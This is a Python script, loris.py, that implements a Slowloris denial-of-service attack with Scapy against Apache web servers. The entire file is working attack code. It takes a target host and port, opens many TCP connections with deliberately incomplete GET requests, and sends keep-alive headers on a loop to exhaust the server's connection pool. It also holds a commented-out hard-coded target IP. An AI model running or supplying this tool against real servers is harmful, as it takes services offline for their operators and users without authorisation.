#!/usr/bin/env python

# Imports
from scapy.all import *
from request_http import *
import time
import argparse
import random

# TITLE: loris.py
# AUTHORS: Matheus Augusto da Silva; Alessandro Montaldo
# This block will call over the function in request_http which we defined earlier
# and also have a few variables and lists containing data pertaining to each
# individual connection

# Parser for the command line
parser = argparse.ArgumentParser(description="A new Slowloris implementation on Scapy; low bandwidthh DoS attack against Apache webservers.")
parser.add_argument('host', nargs="?", help="Target for the Attack.")
parser.add_argument('-p', '--port', default=80, help="Port of webserver, usually 80", type=int)
parser.add_argument('-s', '--sockets', default=150, help="Number of sockets to use", type=int)
parameters = parser.parse_args()

if len(sys.argv) <= 1:
    parser.print_help()
    sys.exit(1)

if not parameters.host:
    print("[-] Please specify the target IP address.")
    parser.print_help()
    sys.exit(1)

get = ("GET /14 HTTP/1.1\r\n") # Incomplete GET
keepalive_header = "X-a: {}\r\n".format(42).encode("utf-8") # Random number to keepalive

# Since Scapy goes a little bit more lower-level than the regular sockets library
# for python ( we are managing TCP connections without a logical layer of abstraction )
# some data structures should be set in place such that TCP rules are followed:
# - Sequence and Acknowledgment numbers should be watched closely
# - We probably can't check the current TCP connection's livelihood without sending another packet,
#   so we'll take a more practical approach and periodically refresh connections.
# - Connections will be refreshed by sending an integer in the HTTP Header
# - GET Requests are incomplete (we need to send two end-of-line characters to finish
#   a request) , only one of the end-of-line characters will be sent
# - If requests are sent unfinished, the server may assume we have a slow Internet
#   connection or a problem has happened, it will trigger a timer and wait a bit before
#   killing the socket
# - If we keep opening a big number of connections the socket pool on the server
#   side may be exhausted, effectively DoS'ing the HTTP service

def main():
    ip_address = parameters.host
    #ip_address = "35.204.165.14"
    port = random.randint(1024,6000) # 4213
    ip = IP(dst=ip_address)
    server_port = parameters.port
    list_size = parameters.sockets
    port_list = list(range(port, port + list_size))
    seqAckList = [None] * list_size
    seqNumList = [None] * list_size

    # This will initialise each individual TCP socket
    print("[+] Initializing " + str(list_size)+ " Sockets")
    for p in range(list_size):
        httpAck = httpRequest(ip_address,p+port)
        seqAckList[p] = httpAck.ack
        seqNumList[p] = httpAck.seq + utf8len(get)

    # This keeps refreshing HTTP connections
    # The acknowledgment numbers remain the same (no data being received from the server)
    # The sequence numbers keep being incremented by the size of the last payload
    while True:
        print("[+] Sending " + str(list_size) + " keepalive headers")
        for p in range(list_size):
            ACK = ip/TCP(sport=port+p,
				 dport=server_port,
				 flags="PA",
				 ack=seqAckList[p],
				 seq=seqNumList[p])

            DATA_SENT=ACK/keepalive_header
            send(DATA_SENT,verbose=False)
            seqNumList[p]+= utf8len(keepalive_header)
            time.sleep(10)

if __name__ == "__main__":
        main()
